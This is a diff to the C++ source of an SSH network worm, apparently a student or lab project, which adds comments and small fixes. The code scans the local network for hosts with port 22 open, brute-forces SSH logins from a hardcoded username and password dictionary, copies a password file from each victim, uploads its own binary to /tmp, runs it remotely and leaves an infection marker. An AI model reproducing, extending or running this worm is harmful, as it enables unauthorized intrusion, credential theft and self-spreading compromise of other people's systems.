@@ -21,8 +21,8 @@
  
  
  
- 
- 
+/*Creates a Marker File named 'infectionMarker_passW_CPP.txt
+on the tmp folder in the Victim system'*/
 void markInfected() {
     std::ofstream myfile("/tmp/infectionMarker_passW_CPP.txt");
  
@@ -32,10 +32,15 @@ void markInfected() {
         myfile.close();
     }
     else
-        printf("Unable to open file");
+        printf("Unable to open Marker file");
  
 }
- 
+
+/*Checks if the system is infected - Checks if Marker file is present in the system at tmp folder
+Input: ssh session
+Output:
+'0' - If there is an error or if file does not exist
+'1' - File exists */
 int isInfected(ssh_session session) {
     sftp_file file;
     int rc;
@@ -47,14 +52,14 @@ int isInfected(ssh_session session) {
     {
         fprintf(stderr, "\nError allocating SFTP session: %s\n",
             ssh_get_error(session));
-        return 11;
+        return 0;
     }
  
     rc = sftp_init(sftp);
     if (rc != SSH_OK)
     {
         sftp_free(sftp);
-        return 1;
+        return 0;
     }
  
     file = sftp_open(sftp, "/tmp/infectionMarker_passW_CPP.txt", access_type, 0);
@@ -68,6 +73,10 @@ int isInfected(ssh_session session) {
     }
 }
  
+/*This function scans Network for IPs in the LAN which have their port 22 open
+Output: Vector of all the host in the Network with Port 22 open
+Reference: https://hackertarget.com/list-all-ips-in-subnet-with-nmap/
+*/
 std::vector<std::string> getHostsOnSameNetwork() {
     FILE *fp;
     char path[1035];
@@ -78,7 +87,7 @@ std::vector<std::string> getHostsOnSameNetwork() {
     if (fp == NULL) {
         printf("\nFailed to run command");
         pclose(fp);
-        //Need to put something
+        //Error handling
     }
     else {
         while (!feof(fp)) {
@@ -92,6 +101,7 @@ std::vector<std::string> getHostsOnSameNetwork() {
     }
 }
  
+/*Need to change this function*/
  
 int copyPasswordFile(ssh_session session, std::string host) {
     int access_type;
@@ -147,7 +157,14 @@ int copyPasswordFile(ssh_session session, std::string host) {
     return SSH_OK;
 }
  
- 
+/*Copies the executable of this worm  to remote system
+Input: ssh Session
+Output:
+'0'  - If error Occurs
+'1' - Successful Copy
+Reference: http://stackoverflow.com/a/13692035/5741374
+Reference: http://api.libssh.org/master/libssh_tutor_sftp.html
+*/
 int copyFile(ssh_session session) {
     sftp_file file;
     int rc;
@@ -159,16 +176,16 @@ int copyFile(ssh_session session) {
     {
         fprintf(stderr, "\nError allocating SFTP session: %s\n",
             ssh_get_error(session));
-        return SSH_ERROR;
+        return 0;
     }
     rc = sftp_init(sftp);
     if (rc != SSH_OK)
     {
         sftp_free(sftp);
-        return rc;
+        return 0
     }
  
-    file = sftp_open(sftp, "/tmp/a.out",
+    file = sftp_open(sftp, "/tmp/passwordW",
         access_type, S_IRWXU);
     if (file == NULL)
     {
@@ -177,7 +194,7 @@ int copyFile(ssh_session session) {
         return 0;
     }
  
-    std::ifstream fin("/tmp/a.out", std::ios::binary);
+    std::ifstream fin("/tmp/passwordW", std::ios::binary);
     if (fin) {
         fin.seekg(0, std::ios::end);
         std::ios::pos_type length = fin.tellg(); // get file size in bytes
@@ -195,16 +212,21 @@ int copyFile(ssh_session session) {
     rc = sftp_close(file);
     if (rc != SSH_OK)
     {
-        fprintf(stderr, "\nCan't close the written file: %s\n",
-            ssh_get_error(session));
+        fprintf(stderr, "\nCan't close the written file: %s\n", ssh_get_error(session));
         return 0;
     }
     printf("\nCopy Successfull !");
     return 1;
- 
- 
+
 }
  
+/*Executes the worm on Victim System
+Input: ssh Session
+Output:
+'0' - Problem in execution
+'1' - Successful execution of remote command
+Refernce: http://api.libssh.org/master/libssh_tutor_command.html
+*/
 int executeFile(ssh_session session) {
     ssh_channel channel;
     int rc;
@@ -214,9 +236,11 @@ int executeFile(ssh_session session) {
         rc = ssh_channel_open_session(channel);
         if (rc == SSH_OK) {
             if (copyFile(session)) {
-                rc = ssh_channel_request_exec(channel, "/tmp/a.out");
+                rc = ssh_channel_request_exec(channel, "/tmp/passwordW");
                 if (rc == SSH_OK) {
-                    printf("\nExecuted command on remote machine");
+					ssh_channel_close(channel);
+					printf("\nExecuted command on remote machine");
+					return 1;
                 }
                 else {
                     printf("\nCannot give run permissions to the file");
@@ -239,6 +263,13 @@ int executeFile(ssh_session session) {
     }
 }
  
+/*Tries to connect to a remote system using ssh protocol
+Tries to login to a system using the predefined Dictionary of usernames and passwords
+Input: ssh Session, IP Address of host, Dictionary of usernames and passwords
+Output:
+'0' - Unsuccessful connection attempt
+'1' - Successful Connection attempt
+*/
 int connectionToHost(ssh_session session, std::string host, std::map<std::string, std::string> &dictAttackList) {
     int rc;
     ssh_options_set(session, SSH_OPTIONS_HOST, host.c_str());
@@ -280,7 +311,7 @@ int connectionToHost(ssh_session session, std::string host, std::map<std::string
  
  
  
- 
+/*Initialized Dictionary for Attack*/
 void initializeDict(std::map<std::string, std::string> &dictAttackList) {
     dictAttackList["ubuntu"] = "123456";
     dictAttackList["hello"] = "worlds";
@@ -296,11 +327,16 @@ int main() {
     ssh_channel channel;
     int res;
     std::map<std::string, std::string> dictAttackList;
+	/*Call to initialize Dictionary*/
     initializeDict(dictAttackList);
- 
+
+	/*Call to mark the system as Infected*/
     markInfected();
+
+	/*Call to fetch Hosts in the Network*/
     std::vector<std::string> hosts = getHostsOnSameNetwork();
  
+	/*Iterating through the hosts to connect and infect the system*/
     for (std::vector<std::string>::iterator host = hosts.begin(); host != hosts.end(); ++host) {
         std::cout << "\n Host: " << *host;
  
@@ -320,5 +356,7 @@ int main() {
                 }
             }
         }
+		else
+			printf("Error occured in connection");
     }
 }
